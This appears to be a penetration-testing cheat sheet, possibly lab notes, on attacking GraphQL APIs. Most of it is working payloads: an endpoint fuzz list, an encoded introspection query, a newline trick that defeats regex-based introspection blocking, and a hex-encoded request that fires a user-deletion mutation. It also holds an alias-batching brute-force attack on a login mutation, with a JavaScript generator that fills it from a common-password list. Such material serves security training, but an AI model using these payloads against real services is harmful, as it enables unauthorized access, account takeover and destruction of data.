[#](#) GraphQL

Fuzz list:

``` 
/graphql?query=query{__typename}
/graphiql?query=query{__typename}
/graphql.php?query=query{__typename}
/graphql/console?query=query{__typename}
/api?query=query{__typename}
/api/graphql?query=query{__typename}
/graphql/api?query=query{__typename}
/graphql/graphql?query=query{__typename}
```

URL-Encoded Introspection Query:

```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

Bypass introspection protection matching the regex filters, and modify the query to include a `%0a` newline character after `__schema` and resend.

```
GET /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a...
```

Save introspection.json and import in `inQL` and copy paste the URL in inQL and Analyze.


deleteOrganizationUser.graphql

```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```

Modify the above as follow and URL encode it:

```
mutation {
    deleteOrganizationUser(input:{id: 1}) {
        user {
            id
        }
    }
}
```

Send the request:

```
GET /api?query=%6d%75%74%61%74%69%6f%6e%20%7b%0a%20%20%20%20%64%65%6c%65%74%65%4f%72%67%61%6e%69%7a%61%74%69%6f%6e%55%73%65%72%28%69%6e%70%75%74%3a%20%7b%69%64%3a%33%7d%29%20%7b%0a%20%20%20%20%20%20%20%20%75%73%65%72%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%64%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%7d HTTP/2
```

Bypass anti-brute force mechanism: find a mutation

Original: (GraphQL Tab)

```
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}
```

Aliases: (GraphQL Tab

```
mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }
}
```

NOTE: it's possible to use this JS to generate longer payload... 

```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

